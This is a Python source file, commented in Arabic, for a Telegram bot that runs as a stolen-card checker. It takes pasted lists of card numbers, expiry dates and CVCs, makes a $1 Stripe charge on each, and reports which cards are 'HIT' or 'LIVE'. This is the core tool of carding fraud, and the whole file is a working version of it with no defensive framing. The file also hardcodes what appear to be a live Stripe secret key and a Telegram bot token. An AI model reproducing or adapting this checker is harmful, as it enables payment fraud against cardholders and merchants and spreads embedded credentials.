import stripe
import telebot
import os
from flask import Flask
from threading import Thread

# 1. إعداد السيرفر الوهمي بشكل فوري
app = Flask(__name__)

@app.route('/')
def health_check():
    return "ALIVE", 200

def start_server():
    # Render يراقب المنفذ 10000، سنقوم بتشغيله فوراً
    app.run(host='0.0.0.0', port=10000)

# 2. إعدادات البوت والمحرك
stripe.api_key = "sk_live_awWzIlT3bp7cGsy4Ord9cRU0"
bot = telebot.TeleBot("8551972896:AAFOysETMd4tuyuArnqPA8-uM2Iz6z4fWuw")
ADMIN_ID = 5473153501

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ <b>البوت متصل الآن!</b>\nأرسل اللستة للفحص المباشر.", parse_mode="HTML")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    if message.from_user.id != ADMIN_ID: return
    
    cards = message.text.strip().split('\n')
    status_msg = bot.reply_to(message, f"⏳ جاري فحص {len(cards)} بطاقة...")
    stats = {"hit": 0, "live": 0, "dead": 0}

    for card in cards:
        try:
            card_clean = card.strip().replace(" ", "")
            if "|" not in card_clean: continue
            num, mm, yy, cvc = card_clean.split('|')
            
            stripe.Charge.create(
                amount=100, currency="usd",
                source={"object": "card", "number": num, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvc}
            )
            stats["hit"] += 1
            bot.send_message(message.chat.id, f"✅ <b>HIT!</b>\n<code>{card_clean}</code>", parse_mode="HTML")
        except stripe.error.CardError as e:
            err = e.json_body.get('error', {})
            if err.get('code') == "insufficient_funds":
                stats["live"] += 1
                bot.send_message(message.chat.id, f"✔️ <b>LIVE</b>\n<code>{card_clean}</code>", parse_mode="HTML")
            else: stats["dead"] += 1
        except Exception: stats["dead"] += 1

    bot.edit_message_text(f"🏁 <b>اكتمل!</b>\n✅ HITS: {stats['hit']} | ⚡ LIVE: {stats['live']} | 💀 DEAD: {stats['dead']}", message.chat.id, status_msg.message_id, parse_mode="HTML")

# 3. تشغيل كل شيء بنظام الخيوط (Threading)
if __name__ == "__main__":
    # تشغيل Flask أولاً في الخلفية
    server_thread = Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    print("Server started on port 10000. Starting bot polling...")
    
    # تشغيل البوت
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"Error: {e}")
